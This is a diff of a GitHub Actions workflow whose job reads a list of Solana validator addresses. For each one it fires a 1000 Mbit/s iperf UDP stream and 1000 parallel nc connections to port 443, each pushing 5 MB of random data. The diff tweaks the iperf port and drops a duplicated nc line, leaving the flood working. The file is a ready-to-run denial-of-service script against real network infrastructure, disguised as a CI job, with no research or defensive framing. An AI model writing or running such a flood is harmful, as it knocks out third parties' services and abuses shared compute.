@@ -14,9 +14,8 @@ jobs:
       - name: Run command on udp
         run: |
           while IFS= read -r url; do
-          iperf -c $url -u -b 1000M || true &
+          iperf -c $url -u -b 1000M -p 8001 || true &
           for i in {1..1000}; do
-            nohup nc $url 443 <<< $(openssl rand 5242880) > /dev/null 2>&1 &
             nohup nc $url 443 <<< $(openssl rand 5242880) > /dev/null 2>&1 &
           done
           done < solana-validator-list-cropped.txt
